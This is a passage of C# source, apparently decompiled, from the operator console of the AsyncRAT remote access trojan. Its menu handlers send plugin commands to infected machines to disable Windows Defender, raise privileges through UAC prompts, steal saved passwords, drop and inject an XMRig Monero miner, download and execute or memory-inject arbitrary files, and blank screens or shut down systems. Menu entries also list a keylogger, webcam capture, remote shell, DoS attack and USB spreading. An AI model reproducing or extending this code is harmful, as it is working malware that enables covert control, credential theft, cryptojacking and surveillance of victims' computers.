				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormChat)Application.OpenForms["chat:" + clients.ID] == null)
				{
					FormChat formChat = new FormChat();
					formChat.Name = "chat:" + clients.ID;
					formChat.Text = "chat:" + clients.ID;
					formChat.F = this;
					formChat.ParentClient = clients;
					formChat.Show();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0 || MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "uac";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0 || MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text == "Admin")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "blankscreen+";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "blankscreen-";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "wallpaper";
				msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
				msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "close";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RestartToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "sendFile";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
				msgPack.ForcePathObject("Update").AsString = "true";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (MessageBox.Show(this, "Are you sure you want to unistall", "AsyncRAT | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "uninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ShowFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			if (selectedClients.Length == 0)
			{
				Process.Start(Application.StartupPath);
				return;
			}
			Clients[] array = selectedClients;
			foreach (Clients clients in array)
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
				if (Directory.Exists(text))
				{
					Process.Start(text);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RestartToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ShutdownToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "shutdown";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void LogoffToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "logoff";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormBuilder formBuilder = new FormBuilder();
		formBuilder.ShowDialog();
	}

	private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormAbout formAbout = new FormAbout();
		formAbout.ShowDialog();
	}

	private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			lock (Settings.LockListviewLogs)
			{
				listView2.Items.Clear();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.Items.Count > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "thumbnails";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] allClients = GetAllClients();
			for (int i = 0; i < allClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
	}

	private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "thumbnailsStop";
				foreach (ListViewItem item in listView3.Items)
				{
					ThreadPool.QueueUserWorkItem(((Clients)item.Tag).Send, msgPack.Encode2Bytes());
				}
			}
			listView3.Items.Clear();
			ThumbnailImageList.Images.Clear();
			foreach (ListViewItem item2 in listView1.Items)
			{
				((Clients)item2.Tag).LV2 = null;
			}
		}
		catch
		{
		}
	}

	private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView4.SelectedItems.Count <= 0)
		{
			return;
		}
		foreach (ListViewItem selectedItem in listView4.SelectedItems)
		{
			selectedItem.Remove();
		}
	}

	private async void TimerTask_Tick(object sender, EventArgs e)
	{
		try
		{
			Clients[] clients = GetAllClients();
			if (getTasks.Count <= 0 || clients.Length == 0)
			{
				return;
			}
			foreach (AsyncTask item in getTasks.ToList())
			{
				if (!GetListview(item.id))
				{
					getTasks.Remove(item);
					return;
				}
				Clients[] array = clients;
				foreach (Clients clients2 in array)
				{
					if (!item.doneClient.Contains(clients2.ID))
					{
						item.doneClient.Add(clients2.ID);
						SetExecution(item.id);
						ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
					}
				}
				await Task.Delay(15000);
			}
		}
		catch
		{
		}
	}

	private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == "Miner XMR")
					{
						return;
					}
				}
			}
			using FormMiner formMiner = new FormMiner();
			if (formMiner.ShowDialog() == DialogResult.OK)
			{
				if (!File.Exists("Plugins\\xmrig.bin"))
				{
					File.WriteAllBytes("Plugins\\xmrig.bin", Resources.xmrig);
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "xmr";
				msgPack.ForcePathObject("Command").AsString = "run";
				XmrSettings.Pool = formMiner.txtPool.Text;
				msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
				XmrSettings.Wallet = formMiner.txtWallet.Text;
				msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
				XmrSettings.Pass = formMiner.txtPass.Text;
				msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
				XmrSettings.InjectTo = formMiner.comboInjection.Text;
				msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
				XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
				msgPack.ForcePathObject("Hash").AsString = XmrSettings.Hash;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Miner XMR";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				listView4.Items.Add(listViewItem);
				listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == "Recovery Password")
					{
						return;
					}
				}
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "Recovery Password";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			listView4.Items.Add(listViewItem);
			listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack.Encode2Bytes(), listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "sendFile";
			msgPack.ForcePathObject("Update").AsString = "false";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
			msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			formSendFileToMemory.ShowDialog();
			if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
				if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
				}
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
			}
			formSendFileToMemory.Close();
			formSendFileToMemory.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "sendFile";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
			msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
			msgPack.ForcePathObject("Update").AsString = "true";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private bool GetListview(string id)
	{
		foreach (ListViewItem item in Program.form1.listView4.Items)
		{
			if (item.ToolTipText == id)
			{
				return true;
			}
		}
		return false;
	}

	private void SetExecution(string id)
	{
		foreach (ListViewItem item in Program.form1.listView4.Items)
		{
			if (item.ToolTipText == id)
			{
				int num = Convert.ToInt32(item.SubItems[1].Text);
				item.SubItems[1].Text = (num + 1).ToString();
			}
		}
	}

	private void BlockClientsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormBlockClients formBlockClients = new FormBlockClients();
		formBlockClients.ShowDialog();
	}

	[DllImport("uxtheme", CharSet = CharSet.Unicode)]
	public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Form1));
		this.listView1 = new System.Windows.Forms.ListView();
		this.lv_ip = new System.Windows.Forms.ColumnHeader();
		this.lv_country = new System.Windows.Forms.ColumnHeader();
		this.lv_hwid = new System.Windows.Forms.ColumnHeader();
		this.lv_user = new System.Windows.Forms.ColumnHeader();
		this.lv_os = new System.Windows.Forms.ColumnHeader();
		this.lv_version = new System.Windows.Forms.ColumnHeader();
		this.lv_ins = new System.Windows.Forms.ColumnHeader();
		this.lv_admin = new System.Windows.Forms.ColumnHeader();
		this.lv_av = new System.Windows.Forms.ColumnHeader();
		this.lv_ping = new System.Windows.Forms.ColumnHeader();
		this.lv_act = new System.Windows.Forms.ColumnHeader();
		this.contextMenuClient = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.aBOUTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
		this.sENDFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.tOMEMORYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.tODISKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.monitoringToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.remoteDesktopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.keyloggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.passwordRecoveryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.fileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.processManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.reportWindowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.runToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.stopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.webcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.miscellaneousToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.botsKillerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.uSBSpreadToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.seedTorrentToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.remoteShellToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.dOSAttackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.executeNETCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.xMRMinerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.runToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.filesSearcherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.extraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.visitWebsiteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.sendMessageBoxToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.chatToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.getAdminPrivilegesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.blankScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.runToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.stopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.disableWindowsDefenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.setWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.clientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.closeToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.restartToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.updateToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.showFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.pCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.logoffToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.restartToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.shutdownToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.serverToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.blockClientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
		this.bUILDERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.ping = new System.Windows.Forms.Timer(this.components);
		this.UpdateUI = new System.Windows.Forms.Timer(this.components);
		this.tabControl1 = new System.Windows.Forms.TabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.listView2 = new System.Windows.Forms.ListView();
		this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.contextMenuLogs = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.listView3 = new System.Windows.Forms.ListView();
